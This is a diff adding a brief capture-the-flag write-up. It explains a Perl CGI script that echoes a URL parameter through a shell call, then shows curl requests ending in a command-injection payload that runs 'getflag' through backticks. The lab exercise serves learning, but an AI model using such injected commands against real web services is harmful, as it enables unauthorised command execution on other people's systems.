@@ -1,0 +1,31 @@
+# First, I will learn a little perl language and decrypt each line of this script:
+
+# localhost:4747 -> The script will run in the background on port 4747
+
+# use CGI qw{param}; -> Import the param function from CGI:: library.
+
+# print "Content-type: text/html\n\n" -> Basic print.
+
+# sub x { -> Function x declaration.
+
+# $y = $_[0]; -> Declaration of the variable '$y', $_[0] means that $y will take the value of the first argument passed to the function.
+
+# print `echo $y 2>&1` -> Basic print of $y.
+
+# x(param("x")) -> Gives to the function x, the value of the parameter 'x'.
+
+# Then, I used curl to see what it displays:
+
+$> curl localhost:4747
+
+# It displays nothing, because x is not defined. So I tried to pass an argument with curl:
+
+$> curl localhost:4747?x="test"
+
+# It displays "test".
+
+# Finaly, I had the idea to pass a shell script as an argument: getflag.
+
+$> curl localhost:4747?x=\`getflag\`
+
+# And There you go !
